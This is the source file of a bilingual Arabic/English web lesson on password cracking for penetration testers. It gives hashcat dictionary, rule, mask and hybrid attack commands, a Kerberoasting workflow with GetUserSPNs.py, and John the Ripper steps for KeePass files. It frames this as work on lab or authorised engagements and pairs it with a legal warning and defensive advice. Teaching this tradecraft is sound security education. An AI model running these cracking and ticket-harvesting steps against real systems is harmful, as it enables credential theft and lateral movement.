"use client";
import { LessonShell, Section, Callout, Code, Terminal, Step, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="password-cracking">
      <L
        ar={<>
          <Section title="لماذا نكسر hashes أصلاً؟">
            <Analogy>
              تخيل أن مكتبة احتفظت بقائمة الكتب التي قرأها كل عضو، لكن استبدلت اسم العضو ببصمة (hash). لا يمكنك
              استرجاع الاسم مباشرة من البصمة، لكن يمكنك أن تأخذ كل الأسماء المعروفة، تحسب بصماتها، وتقارن.
              تلك هي عملية كسر كلمات المرور: ليست عكس الـ hash، بل تخمين الـ password ثم hashing ثم مقارنة.
            </Analogy>
            <p>
              في كل engagement، ستحصل على hashes من LSASS، NTDS.dit، /etc/shadow، أو dump قاعدة بيانات. كسرها
              يحوّل الـ hash إلى credential قابل لإعادة الاستخدام في الحركة الجانبية.
            </p>
          </Section>

          <Section title="أنواع الـ hashes الشائعة">
            <Code lang="text">{`NTLM           — Windows local/domain accounts (16 bytes MD4)
NetNTLMv2      — Network challenge-response (Responder loot)
Kerberos 5 TGS — kerberoasting target (mode 13100)
DCC2 (MSCash2) — cached domain creds on workstations
bcrypt         — modern web apps ($2a$, $2b$)
SHA-512crypt   — Linux /etc/shadow ($6$)
MD5 / SHA1     — لا تزال موجودة في تطبيقات قديمة
PBKDF2-SHA256  — modern, slow (iOS keychain, 1Password)`}</Code>
          </Section>

          <Section title="Hashcat — أداة الميدان">
            <Step n={1} title="بناء rig">
              GPU = ضرورة. RTX 4090 يكسر 280 GH/s NTLM، سرعة عشرات أضعاف CPU. حتى GTX 1080 يكفي للبدء.
            </Step>
            <Step n={2} title="هجوم بقاموس">
              <Code lang="bash">{`# rockyou.txt = القاموس المفضل (14M password)
hashcat -m 1000 -a 0 ntlm-hashes.txt /usr/share/wordlists/rockyou.txt

# -m 1000 = NTLM
# -a 0 = straight wordlist`}</Code>
            </Step>
            <Step n={3} title="هجوم بـ rules">
              قاعدة تعدّل كل كلمة (Capitalize، إضافة 2024، استبدال e بـ 3).
              <Code lang="bash">{`hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# best64.rule = 64 تعديل شائع، يضاعف فعالية القاموس بنسبة 5x-10x`}</Code>
            </Step>
            <Step n={4} title="Mask attack — بنية معروفة">
              لو سياسة الشركة "8 حروف، رقم في النهاية"، استخدم mask.
              <Code lang="bash">{`# ?u=upper ?l=lower ?d=digit ?s=symbol
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?l?d
# Spring2024! style:
hashcat -m 1000 -a 3 hashes.txt -1 'Spring|Summer|Fall|Winter' ?1?d?d?d?d?s`}</Code>
            </Step>
            <Step n={5} title="Hybrid">
              كلمة من القاموس + 4 أرقام في النهاية (تجمع الاثنين).
              <Code lang="bash">{`hashcat -m 1000 -a 6 hashes.txt rockyou.txt ?d?d?d?d`}</Code>
            </Step>
          </Section>

          <Section title="Kerberoasting workflow">
            <p>
              الجوهرة: حسابات الخدمة في AD تستخدم كلمات مرور ضعيفة وقابلة للهاش. أي مستخدم نطاق يستطيع طلب TGS لها.
            </p>
            <Code lang="bash">{`# جلب الـ tickets
GetUserSPNs.py -request corp.local/normaluser:Pass123 -dc-ip 10.0.0.10 -outputfile tgs.hashes

# كسرها (mode 13100)
hashcat -m 13100 -a 0 tgs.hashes rockyou.txt -r best64.rule

# Service accounts often have "Service@2023" / "ServiceName123" passwords`}</Code>
          </Section>

          <Section title="JtR — للحالات التي يفشل فيها hashcat">
            <p>
              John the Ripper جيد للأنواع الغريبة (KeePass، 1Password، PDF، ZIP). hashcat لـ GPU، John لـ CPU + المرونة.
            </p>
            <Code lang="bash">{`# تخمين تلقائي للـ hash type
john --wordlist=rockyou.txt hashes.txt

# على keepass
keepass2john Database.kdbx > kp.hash
john --wordlist=rockyou.txt kp.hash`}</Code>
          </Section>

          <Callout kind="danger" title="تحذير قانوني">
            كسر hashes حصلت عليها من نظام لا تملكه أو dump بيانات مسرّب = جريمة. كل العمل هنا يفترض hashes
            من مختبرك أو engagement مع authorization.
          </Callout>

          <Callout kind="good" title="الدفاع — لماذا تكون كلمة المرور مهمة">
            <ul>
              <li>طول &gt; تعقيد: 16 حرف عشوائي أصعب من Pa$$w0rd1!</li>
              <li>افرض passphrase 4 كلمات (دياقرام XKCD)</li>
              <li>منع كلمات شائعة: HaveIBeenPwned API على signup</li>
              <li>استخدم bcrypt/argon2id بدلاً من MD5/SHA — slow by design</li>
              <li>MFA في كل مكان — يكسر hash لكنه لا يمر</li>
              <li>راقب Kerberoasting: 4769 TGS requests غير اعتيادية</li>
              <li>استخدم Group Managed Service Accounts (gMSA) — كلمات مرور 240 رمز تتغير تلقائياً</li>
            </ul>
          </Callout>

          <Section title="مقاييس">
            <Code lang="text">{`-- RTX 4090 على NTLM --
Pure brute  ?u?l?l?l?l?l?d?d  ≈ 6 ساعات
8-char rockyou + best64       ≈ دقيقتان
Kerberoast (13100) rockyou    ≈ 8 ساعات per ticket

-- DCC2 (slow) --
~4 MH/s فقط — تجنبه إلا للحسابات عالية القيمة`}</Code>
          </Section>

          <Section title="مصادر">
            <ul>
              <li>Hashcat wiki — <span className="eng">hashcat.net/wiki</span></li>
              <li>SecLists — wordlists collection</li>
              <li>Hash-Identifier / hashid — تحديد نوع الـ hash</li>
              <li>CrackStation — lookup tables للـ hashes الضعيفة</li>
            </ul>
          </Section>
        </>}

        en={<>
          <Section title="Why crack hashes at all?">
            <Analogy>
              A library replaces every member's name with a fingerprint (hash) on its borrowing list. You can't reverse
              a fingerprint to a name, but you can take every known name, fingerprint each, and compare. That is
              password cracking: not reversing the hash, but guessing the password, hashing it, and matching.
            </Analogy>
            <p>
              In every engagement you'll harvest hashes from LSASS, NTDS.dit, /etc/shadow, or a database dump. Cracking
              them turns hashes into reusable credentials for lateral movement.
            </p>
          </Section>

          <Section title="Common hash types">
            <Code lang="text">{`NTLM           — Windows local/domain accounts (16 bytes MD4)
NetNTLMv2      — Network challenge-response (Responder loot)
Kerberos 5 TGS — kerberoasting target (mode 13100)
DCC2 (MSCash2) — cached domain creds on workstations
bcrypt         — modern web apps ($2a$, $2b$)
SHA-512crypt   — Linux /etc/shadow ($6$)
MD5 / SHA1     — still around in legacy apps
PBKDF2-SHA256  — modern, slow (iOS keychain, 1Password)`}</Code>
          </Section>

          <Section title="Hashcat — the field tool">
            <Step n={1} title="Build a rig">
              GPU is required. An RTX 4090 cracks 280 GH/s of NTLM — orders of magnitude over CPU. Even a GTX 1080
              works to start.
            </Step>
            <Step n={2} title="Dictionary attack">
              <Code lang="bash">{`# rockyou.txt = the default wordlist (14M passwords)
hashcat -m 1000 -a 0 ntlm-hashes.txt /usr/share/wordlists/rockyou.txt

# -m 1000 = NTLM
# -a 0 = straight wordlist`}</Code>
            </Step>
            <Step n={3} title="Rule-based attack">
              Rules mutate each candidate (capitalize, append 2024, replace e with 3).
              <Code lang="bash">{`hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# best64.rule = 64 common transforms, multiplies wordlist effectiveness 5x-10x`}</Code>
            </Step>
            <Step n={4} title="Mask attack — known structure">
              If policy is "8 chars, digit at end," use a mask.
              <Code lang="bash">{`# ?u=upper ?l=lower ?d=digit ?s=symbol
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?l?d
# Spring2024! style:
hashcat -m 1000 -a 3 hashes.txt -1 'Spring|Summer|Fall|Winter' ?1?d?d?d?d?s`}</Code>
            </Step>
            <Step n={5} title="Hybrid">
              Wordlist entry + 4 trailing digits.
              <Code lang="bash">{`hashcat -m 1000 -a 6 hashes.txt rockyou.txt ?d?d?d?d`}</Code>
            </Step>
          </Section>

          <Section title="Kerberoasting workflow">
            <p>
              The jewel: AD service accounts often have weak, hash-able passwords. Any domain user can request a TGS
              for them.
            </p>
            <Code lang="bash">{`# Request the tickets
GetUserSPNs.py -request corp.local/normaluser:Pass123 -dc-ip 10.0.0.10 -outputfile tgs.hashes

# Crack (mode 13100)
hashcat -m 13100 -a 0 tgs.hashes rockyou.txt -r best64.rule

# Service accounts often have "Service@2023" / "ServiceName123" passwords`}</Code>
          </Section>

          <Section title="JtR — when hashcat doesn't fit">
            <p>
              John the Ripper handles weird formats (KeePass, 1Password, PDF, ZIP). Hashcat for GPU, John for CPU and
              flexibility.
            </p>
            <Code lang="bash">{`# Auto-detect hash type
john --wordlist=rockyou.txt hashes.txt

# KeePass
keepass2john Database.kdbx > kp.hash
john --wordlist=rockyou.txt kp.hash`}</Code>
          </Section>

          <Callout kind="danger" titleEn="Legal warning">
            Cracking hashes harvested from a system you don't own or a leaked breach corpus is a crime. Every workflow
            here assumes hashes from your lab or an authorized engagement.
          </Callout>

          <Callout kind="good" titleEn="Defense — why password policy matters">
            <ul>
              <li>Length &gt; complexity: a 16-char random string beats Pa$$w0rd1!</li>
              <li>Enforce 4-word passphrases (XKCD diceware)</li>
              <li>Block common passwords: HaveIBeenPwned API at signup</li>
              <li>Use bcrypt or argon2id, not MD5/SHA — slow by design</li>
              <li>MFA everywhere — a cracked hash still hits a wall</li>
              <li>Watch for Kerberoasting: anomalous 4769 TGS requests</li>
              <li>Use Group Managed Service Accounts (gMSA) — 240-char passwords, auto-rotated</li>
            </ul>
          </Callout>

          <Section title="Benchmarks">
            <Code lang="text">{`-- RTX 4090 on NTLM --
Pure brute  ?u?l?l?l?l?l?d?d  ≈ 6 hours
8-char rockyou + best64       ≈ 2 minutes
Kerberoast (13100) rockyou    ≈ 8 hours per ticket

-- DCC2 (slow) --
~4 MH/s only — avoid except for high-value accounts`}</Code>
          </Section>

          <Section title="References">
            <ul>
              <li>Hashcat wiki — <span className="eng">hashcat.net/wiki</span></li>
              <li>SecLists — wordlists collection</li>
              <li>Hash-Identifier / hashid — fingerprint hash type</li>
              <li>CrackStation — lookup tables for weak hashes</li>
            </ul>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
